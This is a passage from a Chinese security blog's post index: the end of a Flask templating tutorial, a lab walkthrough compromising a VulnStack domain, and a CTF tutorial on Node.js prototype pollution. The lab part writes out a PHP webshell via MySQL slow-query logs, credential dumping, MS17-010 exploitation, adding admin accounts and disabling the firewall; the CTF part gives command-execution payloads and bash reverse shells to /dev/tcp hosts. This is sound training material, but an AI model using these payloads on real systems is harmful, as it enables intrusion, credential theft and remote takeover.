%&#125;&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;ul>\n    &lt;li>&lt;a href=\"#\">首页&lt;/a>&lt;/li>\n    &lt;li>&lt;a href=\"#\">新闻&lt;/a>&lt;/li>\n&lt;/ul>\n&#123;% block name %&#125;\n&#123;% endblock %&#125;\n&lt;footer>这是底部的标签&lt;/footer>\n&lt;/body>\n&lt;/html>\n\n子模板1child.html内容为\n&#123;% extends \"base.html\" %&#125;\n\n&#123;% block title %&#125;\n我是子模板的标题\n&#123;% endblock %&#125;\n\n&#123;% block name %&#125;\n我是子模板的name\n&#123;% endblock %&#125;\n\n子模板2child2.html内容为\n&#123;% extends \"base.html\" %&#125;\n\n&#123;% block title %&#125;\n我是child2\n&#123;% endblock %&#125;\n\n&#123;% block name %&#125;\n我是child2\n&#123;% endblock %&#125;\n\n此时分别访问child和child2\n\n可以发现两个只有中间不同，头部和底部都是相同的\n加载静态文件除了放html文件，我们还需要放一些图片，js，css文件\n接下来首先说一下加载图片，主文件app.py内容如下\nfrom flask import Flask,render_template #从Flask包中调用flask\n\napp = Flask(__name__)\n\n\n\n\n@app.route('/')\ndef hello_world():\n    age = 17\n    books = [&#123;\n        \"name\":\"三国演义\",\n        \"author\":\"罗贯中\"\n    &#125;,&#123;\n        \"name\":\"水浒传\",\n        \"author\":\"施耐庵\"\n    &#125;]\n    return  render_template(\"control.html\",age=age,books=books)\n\n\n@app.route('/static')\ndef static_home():\n    return render_template(\"static.html\")\n\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n\n\nstatic.html内容如下\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>Title&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;img src=\"&#123;&#123;url_for('static',filename='1.jpg')&#125;&#125;\" alt=\"\">\n&lt;/body>\n&lt;/html>\n\n同时我这里static文件夹下是有1.jpg的\n\n接下来访问界面\n\n可以发现成功加载。\n接下来加载css，我们在static文件夹下新建文件夹，命名为css，在其下创建新文件并命名为style.css，其内容如下\nbody&#123;\n    background-color: pink;\n&#125;\n\n\n而后在static.html中添加这一句话来进行css加载\n&lt;link   rel=\"stylesheet\" href=\"&#123;&#123; url_for('static',filename='css/style.css')&#125;&#125;\">\n\n\n此时去访问界面\n\n接下来去加载js，同理，在static文件夹下创建新文件夹命名为js，在其内创建新文件命名为myjs.js，写入内容如下\nalert(\"我是myjs.js中弹出的\");\n\n接下来在static.html中添加一句话\n&lt;script  src=\"&#123;&#123; url_for('static',filename='js/myjs.js') &#125;&#125;\">&lt;/script>\n\n\n\n然后去访问界面\n","slug":"Flask从0到0.1 part-01","date":"2023-03-13T13:20:20.000Z","categories_index":"WEB知识","tags_index":"FLask","author_index":"quan9i"},{"id":"1435f592b7abfcf9251a6298346c1f3d","title":"内网靶场实战——ATT&CK实战系列（一）","content":"环境搭建靶场地址http://vulnstack.qiyuanxuetang.net/vuln/detail/2/下载过文件后，需配置如下两个虚拟网络（一个内网，一个外网）靶场拓扑图如下这里我们的win7是作为Web服务器的，所以我们需要给Web服务器配置两张网卡，如下所示另外两台机器则是内网机器，只需要设置一张网卡即可接下来如何检测环境是否搭建完成了呢通过ipconfig可查看本机ip，我们这里准备一个kali机器作为攻击机，然后用win7来pingkali机器，再ping两台内网机器，如果可以ping通则说明没问题接下来在Win7中开启phpstudy至此，环境搭建完成。\n本次使用的攻击机及靶场IP\nkali: 192.168.10.128\nWin7：外网192.168.10.129  内网192.168.52.143\nWin2003：192.168.52.141\nWin Server: 192.168.52.138\n外网信息搜集假设现在已知靶机ip，我们使用nmap对外网进行扫描\nnmap.exe -p1-65535 -Pn -A -T4 192.168.10.129\n//这个命令行指令是使用nmap工具（nmap.exe）扫描IP地址为192.168.10.22的设备，扫描端口范围为\n1-65535，使用-Pn选项表示不进行主机发现，使用-A选项表示进行操作系统指纹识别，使用-T4选项表示\n扫描速度为最快。\n\n探测到80及3306端口存活，访问一下发现是PHP探针发现绝对路径泄露，接下来扫描一下是否有其他敏感信息泄露，使用dirsearch进行扫描此时发现phpmyadmin文件存在，访问之尝试弱口令登录，root/root成功登录接下来这里的话是我们可以尝试Mysql写入一句话木马，因为我们刚刚在PHP探针界面已知了绝对路径这里的话我们首先看一下是否有写入权限\nSHOW GLOBAL VARIABLES LIKE '%secure%'\nsecure_file_priv为NULL，禁止导入导出。\n写入木马接下来去寻找绕过secure_file_priv的方法，发现这篇文章https://www.cnblogs.com/c1e4r/articles/8902444.html思路与PHP文件包含中的日志UA传马类似，这里相比更简单一些，通过在日志中写日志，修改日志路径，实现写马。\n慢查询日志默认是禁用的，我们这里对其进行开启\nset global slow_query_log=1;\n接下来修改slow_query_log_file日志文件的绝对路径以及文件名，我们这里已知绝对路径，因此直接写即可\nset global slow_query_log_file='C:/phpStudy/WWW/shell.php'\n此时可以看一下是否修改成功\nshow variables like '%slow%';\n可以看到路径是绝对文件路径。接下来向日志文件写入shell\n'&lt;?php @eval($_POST[1]);?>' or sleep(10)\n成功执行命令，用蚁剑连接ipconfig查看一下网段信息发现还有另一个ip，一眼顶真，有两张网卡，192.168.52.143为内网IP\nCs上线接下来Cs上线，具体步骤如下设置木马监听81端口，而后生成木马文件（记得关闭本机的杀软，例如火绒）接下来通过中国蚁剑上传木马文件在虚拟终端中执行木马文件此时可以看到Win7成功上线\n内网信息搜集Cs此时已上线，我们使用hashdump抓取密码\nhashdump\n运行Mimikatz获取明文密码在蚁剑虚拟终端中执行如下指令，判断是否存在域及当前域\nnet config workstation\n可以确定当前域为god.org查看域内机器\nNet view\n可以发现有两台内网机器，同时确定域服务器名称为OWA接下来联动msf，继续进行渗透在kali中输入msfconsole进入msf接下来利用handler模块开启监听\nmsf6 > use exploit/multi/handler\nmsf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http\nmsf6 exploit(multi/handler) > set lhost 192.168.10.128\nmsf6 exploit(multi/handler) > set lport 8888\nmsf6 exploit(multi/handler) > run\n\n接下来回到Cs，右键选择Spawn设置Payload为Foreign HTTP，监听ip为kaliIP，端口为刚刚的8888端口而后选择choose成功上线msf，接下来搜集补丁信息\nrun post/windows/gather/enum_patches\n搜集电脑上安装的软件\nrun post/windows/gather/enum_applications\n\n发现存在nmap已知这里存在内网，我们这里添加新路由\nrun autoroute -s 192.168.52.0/24\nrun autoroute -p\n\n\n接下来去设置代理，这里使用frp进行内网穿透，首先在kali中执行命令如下\n./frps -c frps.ini\n接下来将frpc.exe和frpc.ini通过蚁剑上传到win7，修改frpc.ini内容如下\n[common]\nserver_addr = 192.168.10.128\nserver_port = 7000\n\n[plugin_socks]\ntype = tcp remote_port = 7777 plugin = socks5\n接下来执行frpc\nfrpc.exe -c frpc.ini\n可以发现代理已设置成功，直接对内网机器进行攻击即可，扫描机器存活端口\nuse auxiliary/scanner/portscan/tcp\nset rhosts 192.168.52.141\nset threads 100\nrun\n扫描到存在135、445端口，说明存在SMB服务\n接管域成员首先扫描机器版本\nuse auxiliary/scanner/smb/smb_version\nset rhosts 192.168.52.141\nrun\n发现是Windows2003版本，那么接下来我们验证一下是否存永恒之蓝漏洞\nsearch ms17-010\nuse 1\nset RHOSTS 192.168.52.141\nrun\n可以发现确实存在永恒之蓝漏洞，直接打\nuse 2\nset payload windows/x64/meterpreter/bind_tcp\nset rhost 192.168.52.141\nset lport 11111\nrun\n但此时没打下来，因此尝试执行一些命令\nuse auxiliary/admin/smb/ms17_010_command\nset rhosts 192.168.52.141\nset command whoami\nrun\n这里的话我们的思路是添加用户，升级为管理员权限，然后尝试手动开启3389端口实现机器接管\nset command net user test hongrisec@2019 /add #添加用户\nrun \n接下来添加管理员权限\nset command net localgroup administrators test /add #管理员权限\nrun\n接下来尝试开启3389端口\nset command 'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'\nrun \n但此时去远控主机却出现了点问题所以接下来更换一下代理方式，将frp换为socks5\nuse auxiliary/server/socks_proxy\nset SRVHOST 192.168.10.128\nset SRVPORT 1080\nrun\n而后编辑一下配置文件\nvim /etc/proxychains.conf\n内容如下接下来尝试远控域成员\nproxychains rdesktop 192.168.52.141 \n用刚刚写入的用户名和密码即可登入接下来进行反弹shell\nuse exploit/windows/smb/ms17_010_psexec\nset payload windows/meterpreter/bind_tcp\nset rhosts 192.168.52.141\nrun\n\n至此，成功接管域内机器\n接管域控扫描域控存活端口发现135、445存活，存在SMB服务，探测主机版本\nuse auxiliary/scanner/smb/smb_version\nset rhosts 192.168.52.138\nrun\n\n接下来同上，执行命令，添加管理员，反弹shell\nuse auxiliary/admin/smb/ms17_010_command\nset rhosts 192.168.52.138\nset command whoami\nrun\nset command 'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'\nrun\nset command netsh firewall set opmode mode=disable #关闭防火墙\nrun\n接下来可以用刚刚抓取到的密码进行远程登录\n而后我们反弹shell\nuse exploit/windows/smb/ms17_010_psexec\nset payload windows/meterpreter/bind_tcp\nset rhosts 192.168.52.138\nrun\n至此，成功接管域控。\n参考文章https://xz.aliyun.com/t/10076#toc-8https://www.freebuf.com/vuls/244095.html\n","slug":"内网靶场实战——ATT&CK实战系列（一）","date":"2023-02-27T18:04:20.000Z","categories_index":"内网","tags_index":"内网","author_index":"quan9i"},{"id":"13607f594fc71a1c9cef23b62fe9395c","title":"浅析CTF中的Node.js原型链污染","content":"声明文章首发于Freebuf社区https://www.freebuf.com/articles/web/361333.html\n前言Node.js之前并未有太多了解，最近遇上了一些相关题目，发现原型链污染是其一个常考点，在学习后对其进行了简单总结，希望对正在学习的师傅有所帮助\nNode.js原型链污染首先强推这篇文章https://developer.mozilla.org/，读完后就会对原型链有个大致的了解，对后面学习非常有帮助。所以说什么是原型链污染呢？\n偏官方一点的解释如下\n\n\n\n\n\n\n\n\n\n在JavaScript中，每个对象都有一个原型，它是一个指向另一个对象的引用。当我们访问一个对象的属性时，如果该对象没有这个属性，JavaScript引擎会在它的原型对象中查找这个属性。这个过程会一直持续，直到找到该属性或者到达原型链的末尾。攻击者可以利用这个特性，通过修改一个对象的原型链，来污染程序的行为。例如，攻击者可以在一个对象的原型链上设置一个恶意的属性或方法，当程序在后续的执行中访问该属性或方法时，就会执行攻击者的恶意代码。\n简单的说呢，其实就是我们对原链中的某个属性进行了污染，向其中插入恶意代码，当我们再调用这个链（也就是使用这个对象）时，我们的恶意代码就会被触发，此时就达到了一个执行恶意代码的效果。说到原型链污染，那就肯定离不开__proto__和prototype,所以接下来我们需要了解一下这两个是什么东西。\n__proto__和prototype在JavaScript中，每个对象都有一个名为__proto__的内置属性，它指向该对象的原型。同时，每个函数也都有一个名为 prototype  的属性，它是一个对象，包含构造函数的原型对象应该具有的属性和方法。简单来说，__proto__  属性是指向该对象的原型，而 prototype属性是用于创建该对象的构造函数的原型。\n这么说有点抽象，因此这里举个例子来进行说明，首先我们打开谷歌浏览器，F12，切换到控制台，而后我们写入如下代码\nfunction Person(name) &#123;\n  this.name &#x3D; name;\n&#125;\n\nPerson.prototype.greet &#x3D; function() &#123;\n  console.log(&#96;Hello, my name is $&#123;this.name&#125;&#96;);\n&#125;;\n\nconst person1 &#x3D; new Person(&#39;Alice&#39;);\nperson1.greet(); &#x2F;&#x2F; 输出 &quot;Hello, my name is Alice&quot;\n\n在例子中，我们创建了一个名为 Person的构造函数，并将prototype上的greet设置为一个打招呼的函数。当我们创建一个名为person1的实例时，它会继承Person.prototype对象上的greet方法。因此，当我们调用person1.greet()时，它会输出 &quot;Hello, my name is Alice&quot;。从这里就可以看出，prototype是类Person的一个属性，所有用类Person进行实例化的对象，都会拥有prototype的全部内容。\n我们实例化出来的person1对象，它是不能通过prototype访问原型的，但通过__proto__就可以实现访问Person原型，具体代码如下\nconsole.log(person1.__proto__ &#x3D;&#x3D;&#x3D; Person.prototype); &#x2F;&#x2F; 输出 true\n\n\n\n\n\n\n\n\n\n\n\n总结（摘自https://www.leavesongs.com）1、prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法2、一个对象的__proto__属性，指向这个对象所在的类的prototype属性\n他们的关系图如下所示\n具体过程那么什么是原型链污染呢我们这里用一个简单例子来对其进行说明\nvar a &#x3D; &#123;number : 520&#125;\nvar b &#x3D; &#123;number : 1314&#125;\nb.__proto__.number&#x3D;520 \nvar c&#x3D; &#123;&#125;\nc.number\n\n对这里的情况需要进行简单说明，我们可以看到在我们进行b.__proto__.number=520  操作后，即使是内容为空的c，调用number属性仍存在且值为我们设定的520，这时就达到了一个原型链污染的目的。接下来再说一下可能部分师傅有疑问的点\n\n\n\n\n\n\n\n\n\n一、为什么执行过b.__proto__.number=520  后，我们输出b的值，其值仍为1314\n这是因为在JavaScript中存在这样一种继承机制：我们这里调用b.number时，它的具体调用过程是如下所示的\n1、在b对象中寻找number属性\n2、当在b对象中没有找到时，它会在b.__proto__中寻找number属性\n3、如果仍未找到，此时会去b.__proto__.__proto__中寻找number属性\n\n也就是说，它从自身开始寻找，然后一层一层向上递归寻找，直到找到或是递归到null为止，此机制被称为JavaScript继承链，我们这里的污染的属性是在b.__proto__中，而我们的b对象本身就有number，所以其值并未改变。\n\n\n\n\n\n\n\n\n\n二、为什么新建的值为空的c对象，调用c.number竟然有值而且为我们设定的520\n当明白上个问题时，这个问题也就迎刃而解了，我们这里的c对象虽然是空的，但JavaScript继承链的机制就会使它继续递归寻找，此时也就来到了c.__proto__中寻找number属性，我们刚刚进行了原型链污染，它的c.__proto__其实就是Object.protoype，而我们进行污染的b.__proto__也是Object.prototype，所以此时它调用的number就是我们刚刚污染的属性，所以这也就是为什么c .number=520\n它常见于当存在函数（其功能是将一个数组的内容复制到另一个数组中）的情况下，示例如下\nfunction merge(target, source) &#123;\n    for (let key in source) &#123;\n        if (key in source &amp;&amp; key in target) &#123;\n            &#x2F;&#x2F; 如果target与source有相同的键名 则让target的键值为source的键值\n            merge(target[key], source[key])\n        &#125; else &#123;\n            target[key] &#x3D; source[key]  &#x2F;&#x2F; 如果target与source没有相通的键名 则直接在target新建键名并赋给键值\n        &#125;\n    &#125;\n&#125;\nlet o1 &#x3D; &#123;&#125;\nlet o2 &#x3D;  JSON.parse&#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 &#x3D; &#123;&#125;\nconsole.log(o3.b)\n\n这里的话可以看到我们的o3内容为空，但调用b属性也是成功输出了2，说明我们刚刚的原型链污染成功了，这里也说一下可能部分师傅有疑问的点。\n\n\n\n\n\n\n\n\n\n一、为什么要加JSON.parse，这个函数有什么作用，不加会怎么样？\n这是因为，JSON解析的情况下，__proto__会被认为是一个真正的键名，而不代表原型，所以在遍历o2的时候会存在这个键。当不加的时候，他就会认为他是一个原型，此时情况如下所以这也就是我们需要添加这个函数的原因\n小拓展（js大小写特性）对于toUpperCase()函数\n字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;\n\n对于toLowerCase\n字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)\n\n详情可见https://www.leavesongs.com/\n实战CatCTF 2022 wife环境参考https://adworld.xctf.org.cn/challenges/list打开题目发现是一个登录界面，给出了注册界面，点击注册界面，可以发现需要一个邀请码如果没有邀请码的话，我们进去是这个样子此时如果考虑到JS原型链污染的话，就变得简单了，应该是我们越权拿到管理员权限，从而获取flag，其注册界面源码如下所示（比赛时是黑盒，这里并未给出源码）\napp.post(&#39;&#x2F;register&#39;, (req, res) &#x3D;&gt; &#123;\n    let user &#x3D; JSON.parse(req.body)\n    if (!user.username || !user.password) &#123;\n        return res.json(&#123; msg: &#39;empty username or password&#39;, err: true &#125;)\n    &#125;\n    if (users.filter(u &#x3D;&gt; u.username &#x3D;&#x3D; user.username).length) &#123;\n        return res.json(&#123; msg: &#39;username already exists&#39;, err: true &#125;)\n    &#125;\n    if (user.isAdmin &amp;&amp; user.inviteCode !&#x3D; INVITE_CODE) &#123;\n        user.isAdmin &#x3D; false\n        return res.json(&#123; msg: &#39;invalid invite code&#39;, err: true &#125;)\n    &#125;\n    let newUser &#x3D; Object.assign(&#123;&#125;, baseUser, user)\n    users.push(newUser)\n    res.json(&#123; msg: &#39;user created successfully&#39;, err: false &#125;)\n&#125;)\n\n我们这里注意到Object.assign方法，他类似之前示例说的clone函数，Object.assign这个方法是可以触发原型链污染的，所以我们这里污染__proto__.isAdmin为 true  就可以了。\n&#123;&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;\n\n此时便可越权拿到flag\nCode-Breaking 2018 Thejs源码参考https://code-breaking.com/puzzle/9/#promo-block搭建环境的话，先安装一下express框架\ncnpm i express -S\n\n而后再安装一下lodash模块即可\nnpm install lodash\n\n而后通过node server.js即可开启题目环境环境如下接下来简单看一下代码\n#server.js\nconst fs &#x3D; require(&#39;fs&#39;)\nconst express &#x3D; require(&#39;express&#39;)\nconst bodyParser &#x3D; require(&#39;body-parser&#39;)\nconst lodash &#x3D; require(&#39;lodash&#39;)\nconst session &#x3D; require(&#39;express-session&#39;)\nconst randomize &#x3D; require(&#39;randomatic&#39;)\n\nconst app &#x3D; express()\napp.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())\napp.use(&#39;&#x2F;static&#39;, express.static(&#39;static&#39;))\napp.use(session(&#123;\n    name: &#39;thejs.session&#39;,\n    secret: randomize(&#39;aA0&#39;, 16),\n    resave: false,\n    saveUninitialized: false\n&#125;))\napp.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; &#x2F;&#x2F; define the template engine\n    fs.readFile(filePath, (err, content) &#x3D;&gt; &#123;\n        if (err) return callback(new Error(err))\n        let compiled &#x3D; lodash.template(content)\n        let rendered &#x3D; compiled(&#123;...options&#125;)\n\n        return callback(null, rendered)\n    &#125;)\n&#125;)\napp.set(&#39;views&#39;, &#39;.&#x2F;views&#39;)\napp.set(&#39;view engine&#39;, &#39;ejs&#39;)\n\napp.all(&#39;&#x2F;&#39;, (req, res) &#x3D;&gt; &#123;\n    let data &#x3D; req.session.data || &#123;language: [], category: []&#125;\n    if (req.method &#x3D;&#x3D; &#39;POST&#39;) &#123;\n        data &#x3D; lodash.merge(data, req.body)\n        req.session.data &#x3D; data\n    &#125;\n\n    res.render(&#39;index&#39;, &#123;\n        language: data.language, \n        category: data.category\n    &#125;)\n&#125;)\n\napp.listen(3000, () &#x3D;&gt; console.log(&#96;Example app listening on port 3000!&#96;))\n\n首先我们这里可以发现存在merge函数\nif (req.method &#x3D;&#x3D; &#39;POST&#39;) &#123;\n        data &#x3D; lodash.merge(data, req.body)\n        req.session.data &#x3D; data\n    &#125;\n\n这里的含义也是比较简单，即将我们POST提交的信息，通过merge合并到session中，最终我们所有提交的信息都会被保存到session中去，那么存在这个merge函数的话，说明我们可以进行原型链污染，那么我们污染的参数该是什么呢，我们这个时候看这几行代码\nfs.readFile(filePath, (err, content) &#x3D;&gt; &#123;\n        if (err) return callback(new Error(err))\n        let compiled &#x3D; lodash.template(content)\n        let rendered &#x3D; compiled(&#123;...options&#125;)\n\n可以发现其对内容进行了lodash.template处理，我们跟进这个函数，具体代码可见https://github.com/lodash\n\n可以发现这个sourceURL当没有值的时候就是一个空的状态，而当其有值时，就会取当前的这个值，我们看接下来他怎么处理可以发现这里被放入了Function的第二个参数，此时我们就可以实现代码执行了。所以我们污染的参数就是sourceURL，具体Payload如下所示\n&#123;&quot;__proto__&quot; : &#123;&quot;sourceURL&quot; : &quot;\\r\\n return e &#x3D;&gt; &#123;for (var a in &#123;&#125; ) &#123;delete Object.prototype[a]; &#125;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;)&#125;\\r\\n&#x2F;&#x2F;&quot;&#125;&#125;\n\n这里需要注意，我们的ConType-type需要修改为application/json，这样才能让__proto__成为键值而非原型，之所以可以直接这样修改是因为express框架支持根据Content-Type来解析请求Body。\n同时，这里之所以不用require的原因如下\n\n\n\n\n\n\n\n\n\nFunction 环境下没有 require 函数，直接使用require(‘child_process’) 会报错，所以我们要用 global.process.mainModule.constructor._load 来代替。\nCTFshow系列web334给了一个附件(zip)，打开的话是两个文件，具体内容如下\n#user.js\nmodule.exports &#x3D; &#123;\n  items: [\n    &#123;username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;&#125;\n  ]\n&#125;;\n\n#login.js\nvar express &#x3D; require(&#39;express&#39;);\nvar router &#x3D; express.Router();\nvar users &#x3D; require(&#39;..&#x2F;modules&#x2F;user&#39;).items;\n \nvar findUser &#x3D; function(name, password)&#123;\n  return users.find(function(item)&#123;\n    return name!&#x3D;&#x3D;&#39;CTFSHOW&#39; &amp;&amp; item.username &#x3D;&#x3D;&#x3D; name.toUpperCase() &amp;&amp; item.password &#x3D;&#x3D;&#x3D; password;\n  &#125;);\n&#125;;\n\n&#x2F;* GET home page. *&#x2F;\nrouter.post(&#39;&#x2F;&#39;, function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  var flag&#x3D;&#39;flag_here&#39;;\n  var sess &#x3D; req.session;\n  var user &#x3D; findUser(req.body.username, req.body.password);\n \n  if(user)&#123;\n    req.session.regenerate(function(err) &#123;\n      if(err)&#123;\n        return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;&#125;);\n      &#125;\n\n      req.session.loginUser &#x3D; user.username;\n      res.json(&#123;ret_code: 0, ret_msg: &#39;登录成功&#39;,ret_flag:flag&#125;);\n    &#125;);\n  &#125;else&#123;\n    res.json(&#123;ret_code: 1, ret_msg: &#39;账号或密码错误&#39;&#125;);\n  &#125;\n\n&#125;);\n\nmodule.exports &#x3D; router;\n\n这里看到user.js里给出了账密，接下来我们在看login.js，这里的话可以看到对账号进行了一个toUpperCase()函数处理，这个函数的作用是将小写字符全部改为大写字符，如下图所示因此我们这里的话账号是CTFSHOW，我们只需要输入ctfshow，他就可以变成CTFSHOW辣\nweb335方法一进入后环境如下没看到有什么有用信息，这个时候查看一下源代码看看有没有有用信息发现提示了eval参数，这个时候我们就需要看一个东西了，即如何在Node.js执行命令http://nodejs.cn/api/child_process.html在其中可以看到这个函数这个只需要写入命令即可，因此我们对其进行简单尝试\neval&#x3D;require(&#39;child_process&#39;).execSync(&#39;ls&#39;)\n\n成功执行命令，接下来尝试获取flag\neval&#x3D;require(&#39;child_process&#39;).execSync(&#39;cat f*&#39;)\n\n\n方法二还有另一个函数这个spawnSync函数的话是需要两个参数，返回值是一个可选项，但当返回值不填时，默认返回的是Object，所以这里其实是三个参数，即命令，命令的参数，以及返回格式，比如我们这里想执行ls .，那我们这里就可以写成spawnSync(&#39;ls&#39;,[&#39;.&#39;]).output，接下来尝试在靶场中执行\neval&#x3D;require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[&#39;.&#39;]).output\n\n成功执行，接下来查看flag\neval&#x3D;require(&#39;child_process&#39;).spawnSync(&#39;tac&#39;,[&#39;fl00g.txt&#39;]).output\n\n\nweb336和上关的环境相似，这里尝试上关的payload\n方法一eval&#x3D;require(&#39;child_process&#39;).execSync(&#39;cat f*&#39;)\n\n回显tql，一眼顶真，这是某些字符串被过滤掉了，这里的话感觉应该是execSync，我们这里可以采用拼接的方法来进行绕过，然后本来的话是.execSync，我们这里可以修改为[&#39;exe&#39;+&#39;Sync&#39;]，小知识[xxx]=.xxx，因此我们这里尝试一下这个方法\neval&#x3D;require(&#39;child_process&#39;)[&#39;exe&#39;%2B&#39;cSync&#39;](&#39;ls&#39;)\n&#x2F;&#x2F;+号进行了URL编码，这是因为不编码的话+会被解析为空格\n\n同理，查看flag\n方法二用上面的第二个函数(spawnSync)可正常执行命令\neval&#x3D;require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl001g.txt&#39;]).output\n\n\nweb 337题目给出了源代码，如下所示\nvar express &#x3D; require(&#39;express&#39;);\nvar router &#x3D; express.Router();\nvar crypto &#x3D; require(&#39;crypto&#39;);\n\nfunction md5(s) &#123;\n  return crypto.createHash(&#39;md5&#39;)\n    .update(s)\n    .digest(&#39;hex&#39;);\n&#125;\n\n&#x2F;* GET home page. *&#x2F;\nrouter.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  var flag&#x3D;&#39;xxxxxxx&#39;;\n  var a &#x3D; req.query.a;\n  var b &#x3D; req.query.b;\n  if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123;\n  \tres.end(flag);\n  &#125;else&#123;\n  \tres.render(&#39;index&#39;,&#123; msg: &#39;tql&#39;&#125;);\n  &#125;\n\n&#125;);\n\nmodule.exports &#x3D; router;\n\n重点在于\nif(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123;\n  \tres.end(flag);\n\nmd5的绕过，这里可以采用数组绕过的方式，构造如下语句即可\na[]&#x3D;1&amp;b&#x3D;1\n\n\n也可以采用这个payload\na[a]&#x3D;1&amp;b[b]&#x3D;12\n\n\n这是因为此时题目两个打印出来的是一致的，都是Object，所以传传a[0]=1&amp;b[0]=2不行是因为当我们这样传的时候相当于创了个变量a=[1] b=[2]，此时的结果\nweb338这里给出了源代码，其中的login.js文件内容如下\nvar express &#x3D; require(&#39;express&#39;);\nvar router &#x3D; express.Router();\nvar utils &#x3D; require(&#39;..&#x2F;utils&#x2F;common&#39;);\n\n\n\n&#x2F;* GET home page.  *&#x2F;\nrouter.post(&#39;&#x2F;&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  var flag&#x3D;&#39;flag_here&#39;;\n  var secert &#x3D; &#123;&#125;;\n  var sess &#x3D; req.session;\n  let user &#x3D; &#123;&#125;;\n  utils.copy(user,req.body);\n  if(secert.ctfshow&#x3D;&#x3D;&#x3D;&#39;36dboy&#39;)&#123;\n    res.end(flag);\n  &#125;else&#123;\n    return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;+JSON.stringify(user)&#125;);\n  &#125;\n\n\n&#125;);\n\nmodule.exports &#x3D; router;\n\n这个用到了utils里的copy函数，我们这里看一下utils中comman.js文件里的内容\nmodule.exports &#x3D; &#123;\n  copy:copy\n&#125;;\n\nfunction copy(object1, object2)&#123;\n    for (let key in object2) &#123;\n        if (key in object2 &amp;&amp; key in object1) &#123;\n            copy(object1[key], object2[key])\n        &#125; else &#123;\n            object1[key] &#x3D; object2[key]\n        &#125;\n    &#125;\n  &#125;\n\n这个的话就是一个简单的赋值，看这里就能猜出考察点是Node.js的原型污染，这里我们如果key是__proto__，就可以实现一个属性污染，这里要求的条件secert.ctfshow===&#39;36dboy&#39;，如果我们去设置一个&quot;__proto__&quot;:&quot;ctfshow:36dboy&quot;,它首先在secret中寻找，没找到ctfshow，就会往上继续找，此时就会找到Object，因为Object.prototype中有ctfshow，所以此时我们就满足了条件，成功绕过\n\nweb339方法一#login.js 部分代码\nrouter.post(&#39;&#x2F;&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  var flag&#x3D;&#39;flag_here&#39;;\n  var secert &#x3D; &#123;&#125;;\n  var sess &#x3D; req.session;\n  let user &#x3D; &#123;&#125;;\n  utils.copy(user,req.body);\n  if(secert.ctfshow&#x3D;&#x3D;&#x3D;flag)&#123;\n    res.end(flag);\n  &#125;else&#123;\n    return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;+JSON.stringify(user)&#125;);\n  &#125;\n\n单看这个login.js的话，我们这里不知道flag，肯定是无法满足secert.ctfshow===flag的与上题相似，但这里的api.js内容中有这样一串代码\nrouter.post(&#39;&#x2F;&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  res.render(&#39;api&#39;, &#123; query: Function(query)(query)&#125;);\n&#125;);\n\n如果我们可以自定义query的内容，就可以实现RCE，所以我们这里的话就用原型链污染来修改__proto__的值，具体payload如下\n&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xx.xxx.xxx&#x2F;xxxxx 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;\n\n接下来去访问api接口，从而调用这个query此时查看我们监听的7777端口，成功反弹shell\ncat login.js|grep flag\n\n\n方法二这个题使用了ejs模板，对于ejs模板RCE我们这里的话可以看一下这两篇文章https://evi0s.com/https://xz.aliyun.com/t/7184#toc-7里面对其进行了具体分析，我比较菜，没大看懂，只知道最后的方法的话就是对一个名为outputFunctionName的成员进行赋值，其内容是我们的恶意代码，然后我们再次请求，就可以触发这个代码的执行，具体payload如下\n&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP地址&#x2F;监听端口 0&gt;&amp;1\\&quot;&#39;);var 